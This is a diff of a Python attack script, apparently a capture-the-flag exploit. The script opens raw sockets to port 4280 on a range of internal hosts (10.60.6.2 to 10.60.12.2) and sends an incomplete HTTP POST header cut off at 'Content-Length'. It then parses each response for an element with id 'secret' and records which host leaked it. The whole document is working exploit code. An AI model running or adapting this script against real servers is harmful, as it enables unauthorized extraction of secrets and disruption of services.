@@ -6,23 +6,31 @@ import re
 from bs4 import BeautifulSoup
 
 import sys
-host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
 
 payload = b'POST / HTTP/1.1\nHost: localhost:4280\nUser-Agent: python-requests/2.18.4\n' + \
 	b'Accept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nContent-Length'
 
+hosts = ['10.60.%d.2' % i for i in range(6, 13)]
+
 sockets = []
-for i in range(1024 - 7):
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect((host, 4280))
-	s.setblocking(0)
-	s.send(payload)
-	sockets.append(s)
+for host in hosts:
+	try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((host, 4280))
+		s.setblocking(0)
+		s.send(payload)
+		sockets.append((s, host))
+	except:
+		print(host)
+		raise
+
 
 found = set()
-for s in sockets:
+i = 0
+for s, host in sockets:
+	i += 1
 	data = b''
-	for _ in range(100):
+	for _ in range(10):
 		try:
 			data = s.recv(4096).decode('utf-8')
 			break
@@ -38,7 +46,7 @@ for s in sockets:
 		soup = BeautifulSoup(response.text, features="html.parser")
 		secret = soup.find(id="secret").text
 		if secret != '':
-			found.add(secret)
+			found.add((secret, host))
 	except:
 		pass
 
